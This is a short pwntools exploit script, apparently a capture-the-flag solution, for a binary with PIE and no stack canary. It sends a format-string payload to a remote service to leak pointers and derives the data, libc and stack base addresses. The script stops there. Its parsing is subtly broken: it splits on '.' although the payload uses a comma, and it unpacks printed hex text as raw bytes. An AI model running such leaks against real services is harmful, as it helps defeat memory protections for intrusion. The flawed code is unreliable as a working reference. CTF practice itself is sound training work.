from pwn import *

context.arch = 'amd64'

#printf(rdi)
#read(rdi,rsi,rdx)
#puts(rdi)

#file decripter
#0  Standard input  stdin
#1  Standard output stdout
#2  Standard error  stderr

#
#   Arch:     amd64-64-little
#   RELRO:    Full RELRO
#   Stack:    No canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   FORTIFY:  Enabled


buf_off = 0x201020
libc_off = 0x20830      #an address which pushed in __libc_start_main, is an addr in libc.
stack_off = 0x206d0     #an address in stack.(main frame)

#printf("%p,%p,%p,%p,%p,%p,%p",rsi,rdx,rcx,r8,r9,stack)
# %6$p -> first stack

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10132)

r.send('%p.%6$p,%9$p')
r.recvuntil(':')

r.recvline()

#the buf_addr is in bss section.
r1,r2,r3 = r.recvline().strip().split('.')
buf_addr = u64(r1.ljust(8,'\0'))
stack_addr = u64(r2.ljust(8,'\0'))
libc_addr = u64(r3.ljust(8,'\0'))

data_base = buf_addr - buf_off
libc_base = libc_addr - libc_off
stack_base = stack_addr - stack_off










